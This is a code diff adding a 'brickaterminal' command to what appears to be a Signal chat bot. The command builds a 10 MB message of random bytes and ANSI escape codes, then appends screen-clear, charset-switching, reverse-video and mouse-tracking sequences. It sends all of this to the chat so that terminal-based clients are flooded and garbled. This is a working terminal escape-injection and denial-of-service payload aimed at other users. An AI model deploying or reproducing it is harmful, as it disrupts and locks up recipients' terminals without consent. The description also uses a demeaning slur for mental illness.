@@ -591,6 +591,43 @@ export default {
                     await sendresponse('Failed to create SSO provider.', envelope, `${prefix}ping`, true);
                 }
             }
+        },
+        "brickaterminal": {
+            description: "Make your terminal Signal client go schizo",
+            arguments: null,
+            execute: async (envelope, message) => {
+                try {
+                    const totalSize = 10 * 1024 * 1024;
+                    const ansiEscapeCodes = [
+                        '\x1b[31m',
+                        '\x1b[32m',
+                        '\x1b[33m',
+                        '\x1b[34m',
+                        '\x1b[35m',
+                        '\x1b[36m',
+                        '\x1b[37m',
+                        '\x1b[1m',
+                        '\x1b[4m',
+                        '\x1b[7m',
+                        '\x1b[0m'
+                    ];
+                    const generateRandomAnsiCode = () => {
+                        const randomIndex = Math.floor(Math.random() * ansiEscapeCodes.length);
+                        return ansiEscapeCodes[randomIndex];
+                    };
+                    let result = '';
+                    while (result.length < totalSize) {
+                        const buf = crypto.getRandomValues(new Uint8Array(1024));
+                        const chunk = String.fromCharCode(...buf);
+                        result += chunk + generateRandomAnsiCode();
+                    }
+                    result = result.slice(0, totalSize);
+                    await sendresponse('\x1b[H\x1b[2J' + result + '\r\n\x1b(0\x1b[?5h\x1b[?1003h', envelope, `${prefix}brickaterminal`, false);
+                } catch (e) {
+                    console.error(e);
+                    await sendresponse('how the fuck', envelope, `${prefix}brickaterminal`, true);
+                }
+            }
         }
     }
 };
